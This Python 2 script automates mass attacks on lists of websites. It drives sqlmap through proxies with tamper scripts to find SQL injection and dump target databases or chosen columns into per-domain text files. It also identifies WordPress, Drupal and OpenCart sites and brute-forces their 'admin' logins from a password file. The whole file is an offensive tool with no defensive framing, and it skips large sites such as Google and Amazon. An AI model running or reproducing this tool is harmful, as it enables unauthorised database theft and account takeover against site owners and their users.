#!/usr/bin/env python
#coding: utf-8
from multiprocessing.dummy import Pool
from subprocess import Popen, PIPE, call, check_call
import os
import re
import sys
import glob
import time
import shutil
import logging
import urlparse
import requests
import traceback
import threading
import builtwith
from random import choice
#from urlparse import urlparse
from datetime import datetime

from psutil import Process, TimeoutExpired

from requests import get
from requests.exceptions import ReadTimeout, ConnectTimeout


import wrapper_config 


try:
    dump = sys.argv[1]
except:
    dump = wrapper_config.COLUMN_DUMP

if (wrapper_config.Check_SQLi == True and wrapper_config.DUMP == True):
    print('Check_SQLi or DUMP')
    sys.exit()
elif (wrapper_config.Check_SQLi == False and wrapper_config.DUMP == False):
    print('Check_SQLi or DUMP')
    sys.exit()


DUMP_SQLMAP_FOLDER = os.path.join(
    os.path.dirname(
        os.path.realpath(__file__)), 
        wrapper_config.DUMP_FOLDER)


DUMP_SQLMAP_SAVE = os.path.join(
    os.path.dirname(
        os.path.realpath(__file__)), 
        wrapper_config.SQLMAP_DUMPS)

print DUMP_SQLMAP_SAVE

DUMP_TXT_FOLDER = os.path.join(
    os.path.dirname(
        os.path.realpath(__file__)), 
        wrapper_config.WRAPPER_TXT_DUMPS)

print DUMP_TXT_FOLDER

        
STEPS = [10,100, 300, 500, 1000, 1500, 2000, 3000, 5000, 10000, 20000, 50000, 100000]
#STEPS = [100]

def checkcms(url):
    try:
        cms = builtwith.builtwith(url)
        w = url + " | CMS: " + cms["cms"][0]
    except:
        w = checkencoom(url)
    return w

def checkencoom(url):
    try:
        cms = builtwith.builtwith(url)
        w = url + " | CMS: " + cms["ecommerce"][0]
    except:
        w = "CMS: Not found"
    return w

def brute(url):
    found = []
    headers = { "Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain", "User-Agent": "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)" }
    cms = checkcms(url)
    if ('WordPress' in cms):
        url = urlparse.urljoin(url, '/') + "wp-login.php"
        response = requests.get(url, headers=headers)
        if(response.status_code == 200):
            filepass = open(wrapper_config.PASSW_FILE, "r")
            lines = filepass.readlines()
            filepass.close()
            for passw in lines:
                wp = {'log': 'admin', 'pwd': passw, 'wp-submit': 'Login', 'redirect_to': url + '/wp-admin/' }
                response = requests.post(url, data=wp, headers=headers)
                if('/wp-admin' in response.url):
                    found = ('URL: ' + url + ' -> login: admin | password: ' + passw + '\n')
    elif('Drupal' in cms):
        url = urlparse.urljoin(url, '/') + "user/login"
        print(url)
        response = requests.get(url, headers=headers)
        if(response.status_code == 200):
            filepass = open(wrapper_config.PASSW_FILE, "r")
            lines = filepass.readlines()
            filepass.close()
            for passw in lines:
                drupal = { 'name': 'admin', 'pass': passw, 'form_build_id': '', 'form_id': 'user_login',  'op' : 'Log in' }
                response = requests.post(url, data=drupal, headers=headers)
                if ('Log out' in response.content):
                    found = ('URL: ' + url + ' -> login: admin | password: ' + passw + '\n')
    elif('OpenCart' in cms):
        url = urlparse.urljoin(url, '/') + "/admin/index.php"
        print(url)
        response = requests.get(url, headers=headers)
        if(response.status_code == 200):
            filepass = open(wrapper_config.PASSW_FILE, "r")
            lines = filepass.readlines()
            filepass.close()
            for passw in lines:
                opencart = { 'username': 'admin', 'password': passw }
                response = requests.post(url, data=opencart, headers=headers)
                if ('Logout' in response.content):
                    found = ('URL: ' + url + ' -> login: admin | password: ' + passw + '\n')
    founds   = ''.join(found) + '\n'
    return founds
    
def sqlmap_check(url, pos, check_timeout, proxy=None):
    print('set %s' % url)
    print('left %s url(s)' % pos)
    if proxy:
        print('set proxy %s://%s' % (wrapper_config.PROXY_TYPE, proxy))
    start_time = datetime.now().time()
    if wrapper_config.PROXY and wrapper_config.PROXY_USERNAME  and wrapper_config.PROXY_PASSWORD:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--count',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--dump-format=CSV',
                '--answers=quit=n,crack=n',
                '--search',
                '-C %s' % dump,
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--proxy-cred=%s:%s' % (
                    wrapper_config.PROXY_USERNAME, 
                    wrapper_config.PROXY_PASSWORD),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    elif wrapper_config.PROXY:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--count',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--dump-format=CSV',
                '--answers=quit=n,crack=n',
                '--search',
                '-C %s' % dump,
                #'--answers="quit=n, crack=n"'
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                #'--proxy=socks5://localhost:9091',
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',

            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    else:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--time-sec=30',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--count',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--search',
                '-C %s' % dump,
                '--dump-format=CSV',
                '--answers=quit=n,crack=n',
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                #'--proxy=socks5://localhost:9091',
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',

            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass

    end_time = datetime.now().time()
    if domains_dublicate(url):
        print('detect domains dublicate %s pass it' % url)
        return False
    dbs_data = log_num_parser(url)
    #print  dbs_data
    #sys.exit()
    
    if dbs_data:
        async_tables_pool = Pool()
        for db, tables in dbs_data.items():
            for table, num in tables.items():
                for step in STEPS: #STEPS = [10,100, 300, 500, 1000, 1500, 2000, 3000, 5000, 10000, 20000, 50000, 100000]
                    if int(num) > step:
                        try:
                            async_tables_pool.apply_async( 
                                    sqlmap_dump(
                                    url,
                                    56000,
                                    proxy))
                        except:pass
                        '''
                        async_tables_pool.apply_async(
                            sqlmap_dump, (
                                url, 
                                db, 
                                table, 
                                [(step - wrapper_config.DUMP_COLUMN_LIMIT + 1), step], 
                                60,
                                proxy))
                        '''
                    else:
                        '''
                        print int(num),'int(num) < step'
                        async_tables_pool.apply_async( 
                            sqlmap_dump(
                                url, 
                                db, 
                                table, 
                                [(step - wrapper_config.DUMP_COLUMN_LIMIT + 1), step], 
                                60,
                                proxy))
                        '''
                        break
        async_tables_pool.close()
        async_tables_pool.join()
        if check_dump_folder(url):
            make_txt_dump(url, log_num_parser(url))
            end_time = datetime.now().time()
            print('done/make txt dump for %s | start: %s | end: %s ' % 
                (url, start_time, end_time))
    remove_dump_folder(url)
    print('remove temp folder %s' % url)




def sqlmap_dump(url, check_timeout, proxy=None):
    start_time = datetime.now().time()
    if wrapper_config.PROXY and wrapper_config.PROXY_USERNAME  and wrapper_config.PROXY_PASSWORD:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--time-sec=30',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--search',
                '-C %s' % dump,
                '--dump-format=CSV',
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--proxy-cred=%s:%s' % (
                    wrapper_config.PROXY_USERNAME, 
                    wrapper_config.PROXY_PASSWORD),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    elif wrapper_config.PROXY:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--search',
                '-C %s' % dump,
                '--dump-format=CSV',
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    else:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--time-sec=15',
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--search',
                '-C %s' % dump,
                '--dump-format=CSV',
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                #'--proxy=socks5://localhost:9091',
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
        

def sqlmap_dump_all(url, check_timeout, proxy=None):
    start_time = datetime.now().time()
    if wrapper_config.PROXY and wrapper_config.PROXY_USERNAME  and wrapper_config.PROXY_PASSWORD:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--time-sec=30',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--dump-all',
                '--dump-format=CSV',
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--proxy-cred=%s:%s' % (
                    wrapper_config.PROXY_USERNAME, 
                    wrapper_config.PROXY_PASSWORD),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    elif wrapper_config.PROXY:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--dump-all',
                '--dump-format=CSV',
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    else:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--time-sec=15',
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--dump-all',
                '--dump-format=CSV',
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                #'--proxy=socks5://localhost:9091',
                '--exclude-sysdbs',
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
        

def sqli_check(url, pos, check_timeout, proxy=None):
    print "Find SQLi"
    print('set %s' % url)
    print('left %s url(s)' % pos)
    if proxy:
        print('set proxy %s://%s' % (wrapper_config.PROXY_TYPE, proxy))
    start_time = datetime.now().time()
    if wrapper_config.PROXY and wrapper_config.PROXY_USERNAME  and wrapper_config.PROXY_PASSWORD:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--time-sec=30',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--proxy-cred=%s:%s' % (
                    wrapper_config.PROXY_USERNAME, 
                    wrapper_config.PROXY_PASSWORD),
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    elif wrapper_config.PROXY:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                '--proxy=%s://%s' % (
                    wrapper_config.PROXY_TYPE, 
                    proxy),
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass
    else:
        process = Popen(
            [
                'python', 
                'sqlmap.py',
                '--url=%s' % url,
                '--time-sec=15',
                '--batch',
                '--level=%s' % wrapper_config.LEVEL,
                '--risk=%s' % wrapper_config.RISK,
                '--random-agent',
                '--threads=3',
                '--answers=quit=n,crack=n',
                '--tamper=%s' % wrapper_config.TAMPER,
                '--output-dir=%s' % wrapper_config.SQLMAP_DUMPS,
                '--timeout=%s' % wrapper_config.TIMEOUT,
                '--retries=%s' % wrapper_config.RETRIES,
                '--technique=EUSQ',
            ])
        psu_process = Process(process.pid)
        try:
            psu_process.wait(check_timeout)
        except TimeoutExpired: pass
        try:
            psu_process.kill()
        except: pass

    find_log(url)

def domains_dublicate(url):
    try:
        domains = urlparse(url).netloc
        if ':' in domains:
            domains = domains.split(':')[0]
            if domains in dublicates:
                return True
        else:
            dublicates.append(domains)
            open('dublicat.txt', 'a+').write(domains + '\n')
            return False
    except:
        return False


def check_dump_folder(url):
    domains = urlparse(url).netloc
    if ':' in domains:
        domains = domains.split(':')[0]
    domains_dump_folder = os.path.join(
        DUMP_SQLMAP_FOLDER, 
        domains,
        'dump')
    try:
        if len(os.listdir(domains_dump_folder)) > 0:
            return True
        else:
            return False
    except OSError:
        return False


def remove_dump_folder(url):
    try:
        if(wrapper_config.DELETE==True):     
            find_dump()
    except OSError:
        print('cant remove %s' % url)


def log_num_parser(url):
    #import pdb; pdb.set_trace()
    domains = urlparse(url).netloc
    if ':' in domains:
        domains = domains.split(':')[0]
    domains_folder = os.path.join(
        DUMP_SQLMAP_FOLDER, 
        domains)
    try:
        log_file = open(os.path.join(
            domains_folder, 'log'))
    except: 
        print('cant get any wrapdump %s' % url)
        return {}
    else:
        data = {}
        for line in log_file:
            line = line.rstrip()       
            if 'Database:' in line:
                db_name = line.split('Database: ')[1]
                try:
                    data[db_name]
                except KeyError:
                    data[db_name] = {}
                else: 
                    break
            if len(data) > 0:
                try:
                    key, num = line.split('|')[1:-1]
                    key, num = key.strip(), num.strip()
                except: pass
                else:
                    if key != 'Table' and num != 'Entries':
                        data[db_name][key] = num
            if 'Table:' in line:
                break
        if data:
            print('get sqli/table(s) numeration %s' % url)
            open('goods.txt', 'a+').write(url + '\n')
        else:
            print('no sqli %s' % url)
            open('bad.txt', 'a+').write(url + '\n')

        return data


def make_txt_dump(url, nums=None):
    domains = urlparse(url).netloc
    if ':' in domains:
        domains = domains.split(':')[0]
    domains_dump_folder = os.path.join(
        DUMP_SQLMAP_FOLDER, 
        domains,
        'dump')
    txt_dump_file = open(
        os.path.join(
            DUMP_TXT_FOLDER, 
            domains.replace('.', '_') + '.txt'), 'a')
    for db_folder in os.listdir(domains_dump_folder):
        for csv_file in os.listdir(os.path.join(
                domains_dump_folder, db_folder)):
                #print data[db_folder] + '-' + 'make_txt_dump'
            try:
                num = nums[db_folder][csv_file.replace('.csv', '')]
            except: num = 1
            txt_dump_file.write('%s - %s:%s\n' % (db_folder, 
                csv_file.replace('.csv', ''),
                num))
            data = open(os.path.join(
                domains_dump_folder, 
                db_folder,
                csv_file)).read().splitlines()
            try:
                col = data.pop(0)
                txt_dump_file.write('%s\n' % col)
                for line in data:
                    if line.strip():
                        txt_dump_file.write('%s\n' % line.replace(',', ' '))
                txt_dump_file.write('\n+++++++++\n\n')
            except:
                pass
    print('make txt dump for %s' % url)
    txt_dump_file.close()


def clean_url(url):
    return url.split("'")[0]


def get_proxies(url):
    try:
        return get(url, timeout=120).text.splitlines()
    except (ConnectTimeout, ReadTimeout):
        print('cant grab proxies %s ; check link' % url)
        sys.exit()

def find_log(url):
    for file in glob.glob(DUMP_SQLMAP_SAVE+"/**"):
        for dirpath, dirnames, files in os.walk(file):
            for filelog in  files:
                if filelog == 'log':
                    if os.path.getsize(dirpath + '/' + filelog) > 0:
                        open(wrapper_config.SQLi_SAVE_FILE, 'a+').write(url + '\n')
                        del_dub(wrapper_config.SQLi_SAVE_FILE)
                
def find_dump():
    for file in glob.glob(DUMP_SQLMAP_SAVE+"/**"):
        for dirpath, dirnames, files in os.walk(file+'/dump'):
            if not files:
                shutil.rmtree(file)

def del_dub(file):
    text_file = open(file)
    lines = text_file.read().split('\n')
    lines = list(set(lines))
    lines = list(filter(None, lines))
    open(file, 'w').close()
    for line in lines:
        open(file, 'a+').write(line+'\n')


def sites_dev():
    if wrapper_config.Check_List == True:
        print('Check list target')
        output = []
        urls = open(wrapper_config.URLS_FILE).read().splitlines()
        for url in urls:
            check = re.compile(r'^(?:http)s?://', re.IGNORECASE)
            checks =  re.match(check, url) is not None 
            if len(url) > 0:
                if checks != True:
                    open(wrapper_config.URLS_FILE, 'a+').write('http://' + url + '\n')
                    del_dub(wrapper_config.URLS_FILE)
        urls = open(wrapper_config.URLS_FILE).read().splitlines()
        for url in urls:
            if not "facebook" in url and not "ebay" in url and not "youtube" in url and not "google" in url and not "cxsecurity" in url and not "pastebin" in url and not "amazon" in url and not "microsoft" in url and not "yahoo" in url and "http" in url and len(url) > 0:
                output.append(url + '\n')
        if output:
            f = open(wrapper_config.URLS_FILE, 'w')
            f.writelines(output)
            f.close()
            del_dub(wrapper_config.URLS_FILE)
        if os.stat(wrapper_config.URLS_FILE).st_size == 0:
            print 'No target'
            sys.exit()


def brutecont():
    if wrapper_config.BRUTE_CMS == True:
        urls = open(wrapper_config.URLS_FILE).read().splitlines()
        for url in urls:
            if checkcms(url) != 'CMS: Not found':
                br = brute(url)
                if br != '':
                    open(wrapper_config.BRUTE_SAVE_FILE, 'a+').write(br + '\n')


def get_dump_size(url):
    domains = urlparse(url).netloc
    if ':' in domains:
        domains = domains.split(':')[0]
    domains_dump_folder = os.path.join(
        DUMP_SQLMAP_FOLDER, 
        domains,
        'dump')
    total_size = 0
    for dirpath, dirnames, filenames in os.walk(domains_dump_folder):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total_size += os.path.getsize(fp)
    return total_size/1024
    


dublicates = None

def threads():
    global dublicates
    dublicates = []
    new = False
    try:
        logfile = open(wrapper_config.LOG_FILE).read().splitlines()
    except: new = True
    else:
        if len(logfile) > 2:
            for line in logfile:
                if 'all work done' in line:
                    new = True
        else:
            new = True
    if new:
        if wrapper_config.DEBUG:
            logging.basicConfig(
                level=logging.DEBUG, 
                filename=wrapper_config.LOG_FILE,
                filemode='w')
        print('starting new session')
        try:
            urls = open(wrapper_config.URLS_FILE).read().splitlines()
        except IOError:
            print('cant open %s check file' % wrapper_config.URLS_FILE)
            sys.exit()

    else:
        if wrapper_config.DEBUG:
            logging.basicConfig(
                level=logging.DEBUG, 
                filename=wrapper_config.LOG_FILE,
                filemode='a')
        print('detect previous session, restore')
        try:
            urls = open(wrapper_config.URLS_FILE).read().splitlines()
            #print   urls
        except IOError:
            print('cant open %s check file' % wrapper_config.URLS_FILE)
            sys.exit()
        for line in reversed(logfile):
            if ':set' in line:
                try:
                    lasturl = line.split(':set ')[1]
                    lasturl_index = urls.index(lasturl) + 1
                except: print('cant detect last url %s in task' % lasturl)
                else:
                    print('detect last url in task %s' % lasturl)
                break
        try:
            for url in urls[0:lasturl_index]:
                if check_dump_folder(clean_url(url)):
                    make_txt_dump(clean_url(url), log_num_parser(clean_url(url)))
                remove_dump_folder(clean_url(url))
            urls = urls[lasturl_index:]
            
        except:
            sys.exit()
    proxies = []
    if wrapper_config.PROXY:
        if wrapper_config.PROXY_FILE:
            proxies = open(wrapper_config.PROXY_FILE).read().splitlines()
            print('get proxies from %s' % wrapper_config.PROXY_FILE)
            
    for lim in range(0, len(urls), wrapper_config.URLS_LIMIT):
        urls_chunk = urls[lim:lim + wrapper_config.URLS_LIMIT]
        pool = Pool(wrapper_config.THREADS)
        for index, url in enumerate(urls_chunk):
            try:
                position = len(urls) - urls.index(url)
            except:
                position = 0

            if wrapper_config.Check_SQLi == True:
                if wrapper_config.PROXY:
                    pool.apply_async(sqli_check, (
                        clean_url(url), 
                        position, 56000, choice(proxies)))
                else:
                    pool.apply_async(sqli_check, (
                        clean_url(url), 
                        position, 56000, ))

            if wrapper_config.DUMP == True:
                if wrapper_config.PROXY:
                    pool.apply_async(sqlmap_check, (
                        clean_url(url), 
                        position, 56000, choice(proxies)))
                else:
                    pool.apply_async(sqlmap_check, 
                        (clean_url(url), position, 56000))

            if wrapper_config.DUMP_ALL == True:
                if wrapper_config.PROXY:
                    pool.apply_async(sqlmap_dump_all, (
                        clean_url(url), 
                        position, 56000, choice(proxies)))
                else:
                    pool.apply_async(sqlmap_dump_all, 
                        (clean_url(url), position, 56000))


        pool.close()
        pool.join()

try:
    sites_dev()
    threads()
    brutecont()
except KeyboardInterrupt:
    sys.exit() 
